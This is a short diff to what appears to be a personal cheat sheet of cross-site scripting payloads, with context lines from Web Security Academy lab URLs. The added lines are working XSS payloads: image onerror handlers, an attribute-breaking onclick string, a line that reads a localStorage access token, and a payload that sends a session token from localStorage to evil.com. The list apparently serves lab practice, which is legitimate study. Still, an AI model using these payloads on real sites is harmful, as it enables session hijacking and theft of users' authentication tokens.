@@ -63,3 +63,11 @@ https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**
 <script>
 location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
 </script>
+
+<img onerror=”{alert`1`}” src>
+”:”xss\”onclick=\”alert(1)”
+ alert(localStorage.getItem('access_token'))
+<img src=x onerror="document.location='https://evil.com?key='+window.localStorage.getItem('simple_auth:session')">
+
+<img src=x onerror=eval(prompt())>
+
